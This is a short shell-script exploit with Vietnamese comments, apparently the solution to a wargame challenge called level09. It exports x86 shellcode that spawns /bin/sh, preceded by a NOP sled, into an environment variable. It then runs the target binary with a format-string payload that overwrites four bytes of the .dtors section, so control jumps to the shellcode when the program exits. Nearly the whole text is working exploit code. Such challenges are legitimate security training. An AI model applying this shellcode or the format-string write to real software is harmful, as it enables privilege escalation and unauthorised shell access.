# 1. Đẩy Shellcode gọi /bin/sh vào biến môi trường nếu cần thiết cho cấu trúc của level09
export SHELLCODE=$(python2 -c 'print "\x90"*100 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')

# 2. Chạy payload khai thác (Sử dụng perl để in payload do có format string)
# - Payload gồm 4 địa chỉ tương ứng với 4 byte của mục tiêu cần ghi (.dtors tại 0x080494d4)
# - Các chuỗi format %u và %n tương ứng sẽ ghi giá trị byte vào từng địa chỉ, làm con trỏ nhảy tới Shellcode khi thoát chương trình.
/levels/level09 $(perl -e 'print "\xd4\x94\x04\x08\xd5\x94\x04\x08\xd6\x94\x04\x08\xd7\x94\x04\x08" . "%233u%4\$n%260u%5\$n%258u%6\$n%192u%7\$n"')
